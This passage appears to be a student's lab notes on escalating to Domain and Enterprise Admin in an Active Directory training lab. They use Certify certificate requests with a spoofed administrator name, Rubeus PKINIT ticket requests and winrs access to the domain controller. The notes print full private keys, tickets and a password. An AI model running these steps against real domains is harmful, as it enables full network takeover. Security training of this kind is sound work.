    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : HTTPSCertificates
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
```

Using certyfy to stract and save the Base64 on OS file:

```
C:\Users\student162>C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:HTTPSCertificates

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : dcorp\student162
[*] No subject name specified, using current context as subject.

[*] Template                : HTTPSCertificates
[*] Subject                 : CN=student162, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 21

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAlIWsp40iNkmrFH3wGO1immsuYTd8/JTLFKu8paQEgVprCKx6
1G3/KR8uCP1XdSDE+5Z6+xqpCz4FHh1HF3ml3/koBDr/iP8KlIPk6RiIIfiTi79D
DCCdkgVDbwISNp+EKndbm1Izuk90mwxe2+LojTtmaf1lQTMTaPMtzzglqiQGQosN
TOoq0TJn9KferzbuMENE9Nxi7CRSnm5+f6Uuuj5yhF8FxNcRFDNjP6+/FtKfe1GA
MoGDpIU9FKUpFMW1hARTkFb7/RnzP6A1/00YMNpLmv7rJ+nXZ1aaUfNVjaVbYJ9u
dzAB6Y8Zf1LjfEMxkLG2f8/9k34drqOabVW/2QIDAQABAoIBAARxr4Xf8jsfny/g
yNNmHwIx3NRp3aKNLTp0HRPzwXLBatx6lL5QgEcRuMXqFrjZfytsCEgFNzOv6mVJ
SPxJ1o3KHclqnoTR5NYm0C2tXz1s+7U9xtrRCwX4hFkI/dSGl2TR53rRTdzwTbPp
/dikhILdWSYov+PgjF8ij6dYrb/WgnHoDNWYfq7hYIIvzYeRxQ3d1VACcTnFSrTt
ATRmdA4tRbkc/Q0ePgfhQ6bnKjKC1hYORo8+shACVHYZBcpzjpTq8++vnHWVL0eA
l02PzPP1t1xjmFNAHKMe+5kqhP5sBZdprs9OnIRHfeL2D3rxgNeN0AGIc6o/vmvm
5CchPUUCgYEAwLdVhv29vToyX9sgfzHPSMnSLQpih57TiTf2Ylx5/tFNXpu6+7DM
xqIETAci6jQVTnUqXHk1pioo+4+s/Jd+S151ZCVysHtyIwITJ3LFiBF1qxr+ZLjM
45NU3aIeqxgqrMsXVlTsO4dRRtKFU0U1+iPGwn5iofAqeraZ4Mv1I0sCgYEAxUst
VYgMaHMXnBCcbYpKMSGorrd29DVbsLLgRK8ohEpqoPpuwVm2l3O2RDzAYk8WiCDe
FY6TGlnNo4Db/Y/FYwkHlBUur97pXYgcB5wudrKPqkb1mLsImhzmnsW/PEk44p11
hxlVKRctONVHb3KVJH0mihaEDAtRddiqjNm4zusCgYBIbR5Ri08hrJt99uZxpxCV
9HNuxfZdrc0mRsfsE4EtyQ9gvPo62Sk8hWtD/3KZvlU7lUEEW/FTr4iTcl262Fx4
itlnd8NwnBQ7H+5+5t1h0937Hjv5MpKd/KLqYKFR/9UZ94Gfym61uJdNHJVKxDoS
9hsewUzkO1RbpgCSwVQxnQKBgEXLIm5vgnQwwtlixvO5SCW5UoL8RAiAF7+ah9vE
WwDxkmcAMM4VfpJ1TLU3CJe+gqoFdosJtOBNhIGixDAe/CTcvOGV3L46jTOZQtEu
XwF+iXQjRh6Ri6l5L9xa+BvLi2Qfb8QrIgU3PbgtOugiEMCnxUp0TKI2HsshqrPJ
EaehAoGACviWudnFskz7vVwuC0BjcWPXg1v3Itay0sLJYnfEyPrIVokEaF7XP1rW
i85rHd56mhdSp3mTMxroxzyHBUOFxsaEH76PlouMy54tCp0Wsa4Z9dgO4XNK7H+m
B87vq4S8GPWEzSkUwxW/6Zt0f2Cj3fNPKY8Y3kOqG3HpfAOFKZo=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGODCCBSCgAwIBAgITFQAAABVonipw4I8S9QAAAAAAFTANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yMzA1MDIx
OTM5NTJaFw0yNTA1MDIxOTQ5NTJaMHMxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh
cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRMwEQYDVQQDEwpzdHVkZW50MTYyMIIBIjAN
BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlIWsp40iNkmrFH3wGO1immsuYTd8
/JTLFKu8paQEgVprCKx61G3/KR8uCP1XdSDE+5Z6+xqpCz4FHh1HF3ml3/koBDr/
iP8KlIPk6RiIIfiTi79DDCCdkgVDbwISNp+EKndbm1Izuk90mwxe2+LojTtmaf1l
QTMTaPMtzzglqiQGQosNTOoq0TJn9KferzbuMENE9Nxi7CRSnm5+f6Uuuj5yhF8F
xNcRFDNjP6+/FtKfe1GAMoGDpIU9FKUpFMW1hARTkFb7/RnzP6A1/00YMNpLmv7r
J+nXZ1aaUfNVjaVbYJ9udzAB6Y8Zf1LjfEMxkLG2f8/9k34drqOabVW/2QIDAQAB
o4IC5DCCAuAwPQYJKwYBBAGCNxUHBDAwLgYmKwYBBAGCNxUIheGocofMn2jhhyaC
n65RgvL2fYE/hpePdoe0hBICAWQCAQYwKQYDVR0lBCIwIAYIKwYBBQUHAwIGCCsG
AQUFBwMEBgorBgEEAYI3CgMEMA4GA1UdDwEB/wQEAwIFoDA1BgkrBgEEAYI3FQoE
KDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMEMAwGCisGAQQBgjcKAwQwRAYJKoZI
hvcNAQkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCAMAcGBSsO
AwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBR3kYh15ovYHabizNY1rfG41pzk8zAf
BgNVHSMEGDAWgBTR/o0Kp/q0Mp82/CC498ueaMVF7TCB2AYDVR0fBIHQMIHNMIHK
oIHHoIHEhoHBbGRhcDovLy9DTj1tb25leWNvcnAtTUNPUlAtREMtQ0EsQ049bWNv
cnAtZGMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bW9uZXljb3JwLERDPWxvY2FsP2NlcnRp
ZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmli
dXRpb25Qb2ludDCBywYIKwYBBQUHAQEEgb4wgbswgbgGCCsGAQUFBzAChoGrbGRh
cDovLy9DTj1tb25leWNvcnAtTUNPUlAtREMtQ0EsQ049QUlBLENOPVB1YmxpYyUy
MEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9
bW9uZXljb3JwLERDPWxvY2FsP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFz
cz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MA0GCSqGSIb3DQEBCwUAA4IBAQAc72eL
wVuaJTvBmNLcC9NEBMxqlNI/hbDaI1XTfI3wjTdQcSIq8EAQ0IJeUV3w9+lSXJFL
+jA/JJ7peXq+Um2ovdcY6fQtRdHGvANi0QpRNkaJ6KEiLzuBjNZepxy5pd+lBC/w
pICua0XJ3NiByZiPljwhbyyIK20sL++KCHshpmV7UAxI1eZ5Yd4shppjFQ+ON04/
p/mrtaqeBp9yBi8W1dBUJzCA2v79M0FpBSB4h+Xay9+XDi6pZvWnB7KQMGjNM/z6
ZYUGBOef+RrDcS88a5v0n9OkqwfO328k8gewjvaP4C9Xd9mHcGPG3qNTzKH/XP4Y
OG88BwOQERwyx2Rb
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

```

Certify completed in 00:00:19.5983580

```
C:\Users\student162>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\cert2.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\cert2.pfx
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:
unable to write 'random state'

```

I shuold reboot domain controller of the platform becaus kerberos do not work properly:


```
C:\AD\Tools>C:\AD\Tools\Rubeus.exe asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=student162, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dollarcorp.moneycorp.local\administrator'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      ZG9sbGFyY29ycC5tb25leWNvcnAubG9jYWw=
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/dollarcorp.moneycorp.local
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
  UserName                 :  administrator
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  5/3/2023 12:28:58 AM
  EndTime                  :  5/3/2023 10:28:58 AM
  RenewTill                :  5/10/2023 12:28:58 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  rgzSotrGb9pmUk2KonYlVA==
  ASREP (key)              :  F8D72B125659F7721FF36C2D0E1A2EB7



```

Access to the domain controller:


```
C:\AD\Tools>klist

Current LogonId is 0:0xa3e025a

Cached Tickets: (1)

#0>     Client: administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 5/3/2023 0:28:58 (local)
        End Time:   5/3/2023 10:28:58 (local)
        Renew Time: 5/10/2023 0:28:58 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
        
C:\AD\Tools>winrs -r:dcorp-dc cmd
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator>whoami
whoami
dcorp\administrator

C:\Users\Administrator>hostname
hostname
dcorp-dc

```

## Enterprise Admin escalation

Looking for vulnerable template:

```
C:\AD\Tools>C:\AD\Tools\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[*] Listing info about the Enterprise CA 'moneycorp-MCORP-DC-CA'

    Enterprise CA Name            : moneycorp-MCORP-DC-CA
    DNS Hostname                  : mcorp-dc.moneycorp.local
    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Agent
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Certificate Request Agent
    mspki-certificate-application-policy  : Certificate Request Agent
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519



Certify completed in 00:00:14.6569470
```

Request vulnerable template with student162 user, because the user belong to the following group [dcorp\Domain Users]

```
C:\AD\Tools>C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent /altname:administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : dcorp\student162
[*] No subject name specified, using current context as subject.

[*] Template                : SmartCardEnrollment-Agent
[*] Subject                 : CN=student162, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] AltName                 : administrator

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 24

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAxLmIaT1GhbtiBZr8AqI/WrsWWIdNt+mMfDfAl4SBIya0nETG
eDHJ/OuIWql5sO7KzTi05UrClhAh5AOC0pyUqVR6Aanrr6r9sbR8ZDCiN9knGTnS
pqgckdOKk2SzzAI9BCVyk6xRlueujQd9rSi0p88UXnoApliDGh9IQZBaQbVPxIQn
Gup969+FDsr6ilDijMXIB0GR7Yy3GZdVTBe8qiOROUUN2qxY7jjwm+flIntRYrIV
jlcKEwQOyYsQ8HLZ3tynbtkGDS7Q3qWD0MFAQZNxVzvuuHiudtyhBwFhFCHUVgkP
jDlW5fXf4mDwo4tnkNNchjV0uMyqrFU5uoExCQIDAQABAoIBAElQe6380BN2ygkc
wV6Z6NJ/dsx3YFdyCpEglf3hu97FxfmXCAAzTfucK6zeDCQMWjgxMflh6zLRwE+h
n1euUxjoCrAkC1nkd7eKc/FCzrHRk+iqy/6gGEWgeLyFgxw8mVC6RAEU7zM2FK8q
Y4Ps76a6XfT3stZLllBd6CfHDFv/9rKxL96noGfKj8XXGJborCrW5U/gGIDxIxM2
S0LhVrQho62E3p6V0IF8pAL3P6C4P5I7olptQc9Ldoi7M+E/yAWFkOyrWYFWbemg
JypEj4lbMeME7yV52RDX3snpCEBhKtY8T9RNUJhX6BK6AydGCg151Adb01QjEIHq
tWyc+CECgYEA7hGq1a3d0FA6iPf3Dd5yqanLwm4ZXth9q+glibnNbtSMPEjiwcv+
BkCjDgLSSiXxTwrgmkwNtp91XNu+HnoXtw4+MgLVJOaRkN2iqSLRsJ3GOqhGQxsC
PRB8lufNtgg/6oXtmDNDM1cC3CulZuyXofoV88PqiBlCyra2/o0Rm4cCgYEA04qv
XYCXoXSfSZBszZVMdI1qYcOyd6mLGj2sLBKejwOJ1Wi0riC/GlY93egJ7D1GK30D
1BQWjRgFCGuPb3BdOA7HT5TOZq2IYPUKZIG07f7AmhEUK3bL50R9OU/WfGjxeeB3
o8hYyARAvat5fB3+aDmKKO9oE51gEWFAEoQyku8CgYEAqI5Htyx3zSLQnuN5vw8N
fgSjKJENU3LSX6Fo2n977Ql+FLzCF9ZXj5O6HpRu0WLV3FHmPji0yOVTkiBfFnL5
UXk7HeuVf5/j1n6lyTzG3FaI4ET+IksAJb4DiFCs/EIRBvo2A7nfzXzAoKQiYqIG
pf9MBaBj8GJ6QM5m+AlnOwcCgYBzl22Z1yGD/PjpNrztXW6IpZmC0G+dyYwUC60f
7BCuLw3LCkrod0ZVetiVgCyj5RuJuec0pMFp2b0uS6/2Ad0+O30XdEWQf7Rs3pkO
MH4QKktOJJTz5xcmSRtwDLs0AhgpM8nMOjahHQnPWnqooq8YfpCLK76gMTeEZ7Ke
K5SDCwKBgBdOYzQXBuQDE1Amwef9sONVbXL4EZBBAdrwObH8Cwb7xtE/0dGrSO5w
sUMCtUcoomTJidpU+Ic/GZurwBsB8pnTCMbW6951kexDMGQNg6a9a71cY2YYtilC
iNqsWHCczC9h5joM96CSAMJ7wGOdpVEUnBEzSY1POAvBLt2Rp/MJ
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGQTCCBSmgAwIBAgITFQAAABgasp1Cewk+1AAAAAAAGDANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yMzA1MDMw
NzI4MzBaFw0yNTA1MDMwNzM4MzBaMHYxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh
cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRYwFAYDVQQDEw1BZG1pbmlzdHJhdG9yMIIB
IjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxLmIaT1GhbtiBZr8AqI/WrsW
WIdNt+mMfDfAl4SBIya0nETGeDHJ/OuIWql5sO7KzTi05UrClhAh5AOC0pyUqVR6
Aanrr6r9sbR8ZDCiN9knGTnSpqgckdOKk2SzzAI9BCVyk6xRlueujQd9rSi0p88U
XnoApliDGh9IQZBaQbVPxIQnGup969+FDsr6ilDijMXIB0GR7Yy3GZdVTBe8qiOR
OUUN2qxY7jjwm+flIntRYrIVjlcKEwQOyYsQ8HLZ3tynbtkGDS7Q3qWD0MFAQZNx
VzvuuHiudtyhBwFhFCHUVgkPjDlW5fXf4mDwo4tnkNNchjV0uMyqrFU5uoExCQID
AQABo4IC6jCCAuYwPAYJKwYBBAGCNxUHBC8wLQYlKwYBBAGCNxUIheGocofMn2jh
hyaCn65RgvL2fYE/guHdfLntDQIBZAIBBTAVBgNVHSUEDjAMBgorBgEEAYI3FAIB
MA4GA1UdDwEB/wQEAwIHgDAdBgkrBgEEAYI3FQoEEDAOMAwGCisGAQQBgjcUAgEw
HQYDVR0OBBYEFE91A/mj/0DjpUk2X9aspPOGalDzMCgGA1UdEQQhMB+gHQYKKwYB
BAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1UdIwQYMBaAFNH+jQqn+rQynzb8
ILj3y55oxUXtMIHYBgNVHR8EgdAwgc0wgcqggceggcSGgcFsZGFwOi8vL0NOPW1v
bmV5Y29ycC1NQ09SUC1EQy1DQSxDTj1tY29ycC1kYyxDTj1DRFAsQ049UHVibGlj
JTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixE
Qz1tb25leWNvcnAsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9i
YXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggrBgEFBQcB
AQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPW1vbmV5Y29ycC1NQ09S
UC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2Vy
dmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1tb25leWNvcnAsREM9bG9jYWw/Y0FD
ZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3Jp
dHkwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEEAYI3GQIBoC4ELFMtMS01LTIxLTcx
OTgxNTgxOS0zNzI2MzY4OTQ4LTM5MTc2ODg2NDgtNTAwMA0GCSqGSIb3DQEBCwUA
A4IBAQC/0oCdwYRwBpV0TSgcHJODVbhgEEPyuonZVKx0ghZxhyXdKBESuvL/VrlD
om6RdC+3jijhOfoJT5NGh+KFEDUSmKG8RhKGucOc1SdvYLD7/Jasu+HpkSAVD4+s
iXomna2TY7oCIR8DlftUoMhOafB9RXK6usTxoShS1+A7esMxMKtriL9c+0etP4x+
tsXFAI/BSxFrFYanPUV2zqgqBVNkVP5VRuUx9j2sfGpOWqkRsbbpWYhx/J4+81L3
LCyARK0hWiYSYDVpyzHWotfwSbxT1fTpH0a0/QQSrABCQePPpJk7MWw23j3rC7rE
UZUOTars4f2Intlp/+UQMEVqYPmT
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:24.2846793

```

Transform pem file to pkcs12:

```
C:\AD\Tools>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\EA.pfx
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:

